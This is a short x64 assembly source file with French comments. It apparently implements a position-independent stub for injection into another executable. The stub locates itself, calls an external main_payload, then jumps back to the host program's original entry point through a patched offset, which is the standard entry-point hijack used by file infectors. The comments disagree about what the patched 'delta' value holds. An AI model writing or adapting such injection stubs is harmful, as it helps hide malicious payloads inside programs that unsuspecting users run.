public __start_code
public delta
extern main_payload:proc

inject segment read execute

__start_code label BYTE
payload proc

    call _next
_next:
    pop rbp
    sub rbp, _next - payload

    sub rsp, 40           ; 32 octets shadow space + 8 pour alignement

    mov rcx, 12           ; place l’argument dans rcx
    call main_payload

    add rsp, 40           ; restaure la pile

    ; accès delta value via RIP-relative offset from rbp
    mov rbx, [rbp + (delta - payload)]  ; rbx = delta (stored offset to OEP)
    sub rbx, 1
    add rbx, rbp                        ; rbx = original entry point (absolute)
    jmp rbx
vars:
    delta label QWORD
    dq 0        ; patched with offset of main_payload
payload endp


inject ends
END
